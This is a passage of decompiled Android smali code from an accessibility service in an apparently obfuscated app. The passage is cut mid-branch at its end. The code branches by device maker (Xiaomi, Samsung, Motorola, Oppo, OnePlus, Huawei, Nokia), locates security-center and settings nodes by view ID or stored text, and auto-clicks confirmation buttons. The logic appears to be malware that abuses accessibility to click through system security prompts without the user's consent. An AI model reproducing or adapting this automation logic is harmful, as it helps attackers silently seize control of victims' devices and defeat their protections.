    const/4 v5, 0x0

    :try_start_1
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_1

    goto/16 :goto_6

    :cond_1
    const-string v7, "com.miui.securitycenter:id/am_storage_view"

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_2

    goto/16 :goto_6

    :cond_2
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_3

    goto/16 :goto_6

    :cond_3
    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v7, 0x96

    invoke-virtual {v6, v7, v8}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v9

    if-nez v9, :cond_4

    goto :goto_0

    :cond_4
    const-string v10, "com.miui.securitycenter:id/action_menu_item_child_icon"

    invoke-virtual {v9, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v9

    if-nez v9, :cond_5

    goto :goto_0

    :cond_5
    invoke-static {v9}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v9, :cond_6

    goto :goto_0

    :cond_6
    invoke-virtual {p0, v9, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {v6, v7, v8}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_7

    goto :goto_0

    :cond_7
    const-string v7, "android:id/text1"

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_8

    goto :goto_0

    :cond_8
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_9

    goto :goto_0

    :cond_9
    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_a

    goto :goto_0

    :cond_a
    const-string v7, "android:id/button1"

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_b

    goto :goto_0

    :cond_b
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_13

    :goto_0
    sget-object v6, Lb0/b;->a:Lb0/b;

    invoke-virtual {v6}, Lb0/b;->o()Ljava/util/Set;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v7

    :cond_c
    invoke-interface {v7}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_14

    invoke-interface {v7}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v9

    if-nez v9, :cond_d

    goto :goto_1

    :cond_d
    invoke-virtual {v9, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v8

    if-nez v8, :cond_e

    :goto_1
    move-object v8, v2

    goto :goto_2

    :cond_e
    invoke-static {v8}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_2
    if-eqz v8, :cond_c

    invoke-virtual {p0, v8, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    move-result v8

    if-eqz v8, :cond_c

    sget-object v7, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v7, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-interface {v6}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_f
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_12

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_10

    goto :goto_3

    :cond_10
    invoke-virtual {v8, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_11

    :goto_3
    move-object v7, v2

    goto :goto_4

    :cond_11
    invoke-static {v7}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_4
    if-eqz v7, :cond_f

    invoke-virtual {p0, v7, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    move-result v7

    if-eqz v7, :cond_f

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    :cond_12
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 3
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-interface {v6, v7, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V

    goto :goto_5

    .line 4
    :cond_13
    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    .line 5
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-interface {v6, v7, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 6
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    :goto_5
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_6

    :catchall_0
    move-exception v6

    :try_start_2
    invoke-static {v6}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_14
    :goto_6
    iget-object v6, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f:Ljava/lang/String;

    const-string v7, "samsung"

    const/4 v8, 0x2

    invoke-static {v6, v7, v5, v8}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v6
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    if-eqz v6, :cond_19

    :try_start_3
    sget-object v2, Lb0/b;->a:Lb0/b;

    invoke-virtual {v2}, Lb0/b;->m()Ljava/util/Set;

    move-result-object v2

    invoke-static {v2}, Lk0/f;->G(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v2

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    invoke-static {v2}, Lk0/f;->N(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v2

    invoke-virtual {p0, v6, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->A(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/List;)Z

    move-result v2

    if-eqz v2, :cond_6f

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_15

    goto :goto_7

    :cond_15
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_7
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_16

    goto/16 :goto_29

    :cond_16
    const-string v6, "com.android.settings:id/button1"

    invoke-virtual {v2, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_17

    goto/16 :goto_29

    :cond_17
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_18

    goto/16 :goto_29

    :cond_18
    invoke-virtual {p0, v2, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v2, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 7
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v2, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 8
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto/16 :goto_29

    :catchall_1
    move-exception v0

    :try_start_4
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    goto/16 :goto_29

    :cond_19
    iget-object v6, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f:Ljava/lang/String;

    const-string v7, "motorola"

    invoke-static {v6, v7, v5, v8}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v6

    if-eqz v6, :cond_21

    sget-object v2, Lb0/b;->a:Lb0/b;

    invoke-virtual {v2}, Lb0/b;->m()Ljava/util/Set;

    move-result-object v2

    invoke-static {v2}, Lk0/f;->G(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v2

    check-cast v2, Ljava/util/ArrayList;

    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_8
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_6f

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_1a

    goto :goto_8

    :cond_1a
    invoke-virtual {v7, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_1b

    goto :goto_8

    :cond_1b
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_1c

    goto :goto_8

    :cond_1c
    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_1d

    goto :goto_9

    :cond_1d
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_9
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_1e

    goto :goto_8

    :cond_1e
    const-string v7, "com.android.settings:id/button1"

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_1f

    goto :goto_8

    :cond_1f
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_20

    goto :goto_8

    :cond_20
    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 9
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-interface {v6, v7, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 10
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l()V

    goto :goto_8

    :cond_21
    iget-object v6, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f:Ljava/lang/String;

    const-string v7, "oppo"

    invoke-static {v6, v7, v5, v8}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v6

    if-eqz v6, :cond_29

    sget-object v2, Lb0/b;->a:Lb0/b;

    invoke-virtual {v2}, Lb0/b;->m()Ljava/util/Set;

    move-result-object v2

    invoke-static {v2}, Lk0/f;->G(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v2

    check-cast v2, Ljava/util/ArrayList;

    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_a
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_6f

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_22

    goto :goto_a

    :cond_22
    invoke-virtual {v7, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_23

    goto :goto_a

    :cond_23
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_24

    goto :goto_a

    :cond_24
    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_25

    goto :goto_b

    :cond_25
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_b
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_26

    goto :goto_a

    :cond_26
    const-string v7, "com.android.settings:id/button"

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_27

    goto :goto_a

    :cond_27
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_28

    goto :goto_a

    :cond_28
    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 11
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-interface {v6, v7, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 12
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l()V

    goto :goto_a

    :cond_29
    iget-object v6, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f:Ljava/lang/String;

    const-string v7, "oneplus"

    invoke-static {v6, v7, v5, v8}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v6

    if-eqz v6, :cond_31

    sget-object v2, Lb0/b;->a:Lb0/b;

    invoke-virtual {v2}, Lb0/b;->m()Ljava/util/Set;

    move-result-object v2

    invoke-static {v2}, Lk0/f;->G(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v2

    check-cast v2, Ljava/util/ArrayList;

    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_c
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_6f

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_2a

    goto :goto_c

    :cond_2a
    invoke-virtual {v7, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_2b

    goto :goto_c

    :cond_2b
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_2c

    goto :goto_c

    :cond_2c
    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_2d

    goto :goto_d

    :cond_2d
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_d
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_2e

    goto :goto_c

    :cond_2e
    const-string v7, "com.android.settings:id/button1"

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_2f

    goto :goto_c

    :cond_2f
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_30

    goto :goto_c

    :cond_30
    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 13
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-interface {v6, v7, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 14
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l()V

    goto :goto_c

    :cond_31
    iget-object v6, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f:Ljava/lang/String;

    const-string v7, "hmd global"

    invoke-static {v6, v7, v5, v8}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v6

    if-nez v6, :cond_67

    iget-object v6, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f:Ljava/lang/String;

    const-string v7, "nokia"

    invoke-static {v6, v7, v5, v8}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v6

    if-eqz v6, :cond_32

    goto/16 :goto_26

    :cond_32
    iget-object v6, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f:Ljava/lang/String;

    const-string v7, "huawei"

    invoke-static {v6, v7, v5, v8}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v6
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    const-string v7, "it.parent"

    if-eqz v6, :cond_3d

    :try_start_5
    sget-object v2, Lb0/b;->a:Lb0/b;

    invoke-virtual {v2}, Lb0/b;->m()Ljava/util/Set;

    move-result-object v2

    invoke-static {v2}, Lk0/f;->G(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v2

    check-cast v2, Ljava/util/ArrayList;

    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_e
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_6f

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_33

    goto :goto_e

    :cond_33
    invoke-virtual {v8, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_34

    goto :goto_e

    :cond_34
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_35

    goto :goto_e

    :cond_35
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    invoke-static {v6, v7}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_36

    goto :goto_f

    :cond_36
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_f
    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_37

    goto :goto_10

    :cond_37
    const-string v9, "com.android.settings:id/button_2"

    invoke-virtual {v8, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v8

    if-nez v8, :cond_38

    goto :goto_10

    :cond_38
    invoke-static {v8}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v8, :cond_39

    goto :goto_10

    :cond_39
